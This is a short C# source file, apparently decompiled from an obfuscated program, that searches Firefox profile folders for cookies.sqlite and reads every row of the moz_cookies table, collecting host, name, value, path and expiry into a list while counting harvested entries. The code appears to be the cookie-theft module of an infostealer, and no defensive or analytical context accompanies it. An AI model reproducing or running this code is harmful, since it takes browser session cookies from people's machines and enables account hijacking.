using System;
using System.Collections.Generic;
using System.IO;
using ns13;

namespace ns10;

internal sealed class Class34
{
	private static string smethod_0(string string_0)
	{
		try
		{
			string path = string_0 + "\\Profiles";
			if (Directory.Exists(path))
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (File.Exists(text + "\\cookies.sqlite"))
					{
						return text + "\\cookies.sqlite";
					}
				}
			}
		}
		catch
		{
		}
		return null;
	}

	public static List<Struct2> smethod_1(string string_0)
	{
		List<Struct2> list = new List<Struct2>();
		try
		{
			Class57 @class = Class58.smethod_0(smethod_0(string_0), "moz_cookies");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				Struct2 item = default(Struct2);
				item.String_0 = @class.method_0(i, 4);
				item.String_1 = @class.method_0(i, 2);
				item.String_5 = @class.method_0(i, 3);
				item.String_2 = @class.method_0(i, 5);
				item.String_3 = @class.method_0(i, 6);
				Class53.smethod_4(item.String_0);
				Class54.int_3++;
				list.Add(item);
			}
			return list;
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return new List<Struct2>();
	}
}
